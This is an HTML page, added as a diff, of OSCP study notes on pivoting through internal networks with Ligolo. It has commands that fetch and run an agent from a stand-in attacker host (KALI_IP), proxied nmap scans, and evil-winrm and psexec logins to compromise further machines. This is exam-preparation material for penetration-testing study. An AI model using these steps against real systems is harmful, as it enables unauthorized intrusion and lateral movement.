@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Pivoting - Ligolo (OSCP Notes)</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <nav>
+        <a href="index.html">Home</a>
+
+        <div class="dropdown">
+            <a href="#">AD ▾</a>
+            <div class="dropdown-content">
+                <a href="enumeration.html">Enumeration</a>
+                <a href="attacking.html">Attacking</a>
+                <a href="lateralMovement.html">Lateral Movement</a>
+                <a href="metodologie.html">Methodology</a>
+            </div>
+        </div>
+
+        <a href="windows_privesc.html">Windows PrivEsc</a>
+        <a href="linux-privesc.html">Linux Privesc</a>
+        <a href="file-transfer.html">File Transfer</a>
+        <a href="checklist.html">Checklist</a>
+        <a href="pivoting.html">Pivoting</a>>
+    </nav>
+
+    <div class="container">
+
+        <h1>Pivoting with Ligolo (Single & Double Pivot)</h1>
+
+        <!-- ============================== -->
+        <!-- 1. Initial Foothold -->
+        <!-- ============================== -->
+
+        <div class="section">
+            <div class="section-header">1. After Reverse Shell (Machine A)</div>
+            <div class="section-content">
+
+                <p>We have a shell on Machine A. First step is to identify internal networks.</p>
+
+                <h3>Linux</h3>
+                <pre><code>ip addr
+ip route
+</code></pre>
+
+                <h3>Windows</h3>
+                <pre><code>ipconfig /all
+route print
+</code></pre>
+
+                <p><strong>Goal:</strong> Find internal subnet (e.g. 192.168.1.0/24)</p>
+
+            </div>
+        </div>
+
+        <!-- ============================== -->
+        <!-- 2. Setup Ligolo -->
+        <!-- ============================== -->
+
+        <div class="section">
+            <div class="section-header">2. Setup Ligolo (Kali)</div>
+            <div class="section-content">
+
+                <pre><code>git clone https://github.com/afklm/ligolo.git
+cd ligolo
+make
+</code></pre>
+
+                <pre><code>./ligolo-server -listen 0.0.0.0:1080
+</code></pre>
+
+                <p>SOCKS5 proxy running on 127.0.0.1:1080</p>
+
+            </div>
+        </div>
+
+        <!-- ============================== -->
+        <!-- 3. Transfer + Execute -->
+        <!-- ============================== -->
+
+        <div class="section">
+            <div class="section-header">3. Deploy Agent on Machine A</div>
+            <div class="section-content">
+
+                <h3>Linux</h3>
+                <pre><code>wget http://KALI_IP/ligolo-client -O /tmp/ligolo
+chmod +x /tmp/ligolo
+/tmp/ligolo -s KALI_IP:1080
+</code></pre>
+
+                <h3>Windows</h3>
+                <pre><code>iwr http://KALI_IP/ligolo.exe -OutFile C:\Users\Public\ligolo.exe
+C:\Users\Public\ligolo.exe -s KALI_IP:1080
+</code></pre>
+
+            </div>
+        </div>
+
+        <!-- ============================== -->
+        <!-- 4. Scan Internal Network -->
+        <!-- ============================== -->
+
+        <div class="section">
+            <div class="section-header">4. Pivot A → Internal Network</div>
+            <div class="section-content">
+
+                <pre><code>proxychains nmap -sS -Pn -n 192.168.1.0/24
+</code></pre>
+
+                <p>Find Machine B (example: 192.168.1.20)</p>
+
+            </div>
+        </div>
+
+        <!-- ============================== -->
+        <!-- 5. Access Machine B -->
+        <!-- ============================== -->
+
+        <div class="section">
+            <div class="section-header">5. Access Machine B</div>
+            <div class="section-content">
+
+                <pre><code>proxychains evil-winrm -i 192.168.1.20 -u user -p password
+proxychains ssh user@192.168.1.20
+</code></pre>
+
+                <p>Now we have access to Machine B.</p>
+
+            </div>
+        </div>
+
+        <!-- ============================== -->
+        <!-- 6. Double Pivot -->
+        <!-- ============================== -->
+
+        <div class="section">
+            <div class="section-header">6. Double Pivot (A → B → C)</div>
+            <div class="section-content">
+
+                <p>Machine B has another internal network (e.g. 10.10.10.0/24)</p>
+
+                <h3>Step 1 – Enumerate from B</h3>
+
+                <h4>Linux</h4>
+                <pre><code>ip route
+</code></pre>
+
+                <h4>Windows</h4>
+                <pre><code>route print
+</code></pre>
+
+                <p>Example new subnet: 10.10.10.0/24</p>
+
+                <h3>Step 2 – Transfer Ligolo to B</h3>
+
+                <pre><code># From your existing shell on B
+iwr http://KALI_IP/ligolo.exe -OutFile ligolo.exe
+</code></pre>
+
+                <h3>Step 3 – Run second agent (B → Kali)</h3>
+
+                <pre><code>ligolo.exe -s KALI_IP:1080
+</code></pre>
+
+                <p>Now Kali has access to BOTH networks.</p>
+
+                <h3>Step 4 – Scan deeper network (C)</h3>
+
+                <pre><code>proxychains nmap -sS -Pn 10.10.10.0/24
+</code></pre>
+
+                <p>Find Machine C.</p>
+
+                <h3>Step 5 – Exploit Machine C</h3>
+
+                <pre><code>proxychains evil-winrm -i 10.10.10.30 -u user -p password
+proxychains impacket-psexec domain/user:password@10.10.10.30
+</code></pre>
+
+            </div>
+        </div>
+
+        <!-- ============================== -->
+        <!-- 7. Mental Model -->
+        <!-- ============================== -->
+
+        <div class="section">
+            <div class="section-header">7. OSCP Mental Model</div>
+            <div class="section-content">
+
+                <ol>
+                    <li>Compromise Machine A</li>
+                    <li>Enumerate internal network</li>
+                    <li>Pivot with Ligolo</li>
+                    <li>Find Machine B</li>
+                    <li>Compromise Machine B</li>
+                    <li>Enumerate again</li>
+                    <li>Find deeper subnet</li>
+                    <li>Deploy second Ligolo agent</li>
+                    <li>Scan new network</li>
+                    <li>Compromise Machine C</li>
+                </ol>
+
+            </div>
+        </div>
+
+        <!-- ============================== -->
+        <!-- 8. Pro Tips -->
+        <!-- ============================== -->
+
+        <div class="section">
+            <div class="section-header">8. Pro Tips</div>
+            <div class="section-content">
+
+                <ul>
+                    <li>Always re-enumerate after pivoting</li>
+                    <li>Each machine = new network visibility</li>
+                    <li>Run Ligolo on EVERY pivot point</li>
+                    <li>Use proxychains for everything</li>
+                    <li>Focus on SMB, WinRM, LDAP internally</li>
+                </ul>
+
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        document.querySelectorAll(".section-header").forEach(h => {
+            h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+        })
+    </script>
+
+</body>
+
+</html>
